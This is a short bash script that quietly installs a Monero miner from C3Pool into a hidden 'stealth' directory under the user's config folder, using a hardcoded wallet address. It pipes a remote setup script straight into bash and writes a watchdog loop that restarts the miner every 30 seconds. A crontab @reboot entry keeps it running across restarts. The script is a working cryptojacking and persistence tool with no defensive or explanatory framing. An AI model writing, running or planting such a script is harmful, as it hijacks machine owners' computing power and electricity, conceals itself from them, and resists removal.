#!/bin/bash
#conf
WALLET="46FP3DQetYzXjMCfns9HEChTzFynnThvY3bXRiELmrRr2yN6zr5YBu4bs8VWjYxdH4ASQsN89Xb4qDjfjTNW35iCKpNJNX7"
#make
STEALTH_DIR="$HOME/.config/.c3pool"
MINER_SUBDIR="$STEALTH_DIR/c3pool"
mkdir -p "$MINER_SUBDIR"
#Install
echo "[*] Installing C3Pool -> $MINER_SUBDIR ..."
curl -s -L https://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | env HOME="$STEALTH_DIR" LC_ALL=en_US.UTF-8 bash -s "$WALLET"
sleep 5
#watchdog
echo "[*] Creating watchdog..."
cat > "$STEALTH_DIR/watchdog.sh" << 'EOF'
#!/bin/bash

MINER_DIR="$HOME/.config/.c3pool/c3pool"
MINER_BIN="$MINER_DIR/xmrig"
CONFIG="$MINER_DIR/config_background.json"
LOGFILE="$MINER_DIR/xmrig.log"

while true; do
    if ! pgrep -f "$MINER_BIN" > /dev/null; then
        echo "[$(date)] xmrig not running. Starting..." >> "$LOGFILE"
        nohup "$MINER_BIN" --config="$CONFIG" >> "$LOGFILE" 2>&1 &
    fi
    sleep 30 
done
EOF
chmod +x "$STEALTH_DIR/watchdog.sh"
#watchdog end
#run
pkill -f "$STEALTH_DIR/watchdog.sh" 2>/dev/null
echo "[*] Runing watchdog -> background..."
nohup "$STEALTH_DIR/watchdog.sh" > /dev/null 2>&1 &
#fure watchdog
if command -v crontab >/dev/null 2>&1; then
    echo "[*] Add watchdog -> crontab @reboot..."
    (crontab -l 2>/dev/null; echo "@reboot nohup $STEALTH_DIR/watchdog.sh > /dev/null 2>&1 &") | crontab -
else
    echo "[!] crontab Not Found, Skip auto-reboot."
fi

echo "[✓] Done. Miner Saved -> $MINER_SUBDIR & run -> background."
#done